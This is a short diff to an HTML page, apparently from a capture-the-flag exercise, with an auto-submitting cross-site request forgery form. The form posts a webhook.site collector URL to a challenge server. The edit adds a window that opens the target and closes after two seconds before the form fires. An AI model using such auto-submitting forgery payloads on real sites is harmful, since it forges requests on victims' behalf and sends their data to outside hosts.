@@ -1,6 +1,8 @@
 <form id="aaa" action="https://zero-meme.edu-ctf.bookgin.tw:44303/me" method="POST">
-    <input name="intro" value="https://webhook.site/11ccddaa-5e2c-4a6c-b37d-38f81e6b875c">
+<input name="intro" value="https://webhook.site/11ccddaa-5e2c-4a6c-b37d-38f81e6b875c">
 </form>
 <script>
-    document.getElementById('aaa').submit();
+let w = window.open("https://zero-meme.edu-ctf.bookgin.tw:44303/me", '');
+setTimeout(function(){w.close(); document.getElementById('aaa').submit()}, 2000);
+
 </script>
